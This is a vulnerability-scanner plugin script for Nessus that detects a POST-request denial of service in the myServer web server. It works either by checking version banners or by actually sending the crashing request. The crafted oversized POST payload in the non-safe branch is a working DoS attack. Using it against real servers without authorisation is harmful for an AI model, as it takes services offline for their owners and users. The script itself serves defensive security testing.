#
#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#  based on work from
#  (C) Tenable Network Security
#
#  Ref: badpack3t <badpack3t@security-protocols.com> for .:sp research labs:.
#
#  This script is released under the GNU GPL v2
#

if(description)
{
 script_id(14838);
 #script_bugtraq_id(?);
 if ( defined_func("script_xref")) script_xref(name:"OSVDB", value:"10333");
 script_version ("$Revision: 1.2 $");

 name["english"] = "myServer POST Denial of Service";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running myServer, an open-source http server.
This version is vulnerable to remote denial of service attack.

With a specially crafted HTTP POST request, an attacker can cause the service 
to stop responding.

Solution : Upgrade to the latest version of this software or use another web server
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Test POST DoS on myServer";
 script_summary(english:summary["english"]);
 
 script_category(ACT_MIXED_ATTACK);

 
 script_copyright(english:"This script is Copyright (C) 2004 David Maciejak");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 
 script_dependencie("find_service.nes", "www_too_long_url.nasl");
 script_exclude_keys("www/too_long_url_crash");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

port = get_http_port(default:80);

if(get_port_state(port))
{
 banner = get_http_banner(port:port);
 if(!banner) exit(0);
 if ( "MyServer" >!< banner ) exit(0);

 if (safe_checks())
 {
 	#Server: MyServer 0.7.1
 	if(egrep(pattern:"^Server: *MyServer 0\.([0-6]\.|7\.[0-1])[^0-9]", string:banner))
        {
          security_hole(port);
        }
   exit(0);
 }
 else
 {
   if(http_is_dead(port:port))exit(0);
   data = http_post(item:string("index.html?View=Logon HTTP/1.1\r\n", crap(520), ": ihack.ms\r\n\r\n"), port:port); 
   soc = http_open_socket(port);
   if(soc > 0)
   {
    send(socket:soc, data:data);
    http_close_socket(soc);
    sleep(1);
    soc2 = http_open_socket(port);
    if(!soc2)
    {
	security_hole(port);
    }
    else http_close_socket(soc2);
   }
 }
}
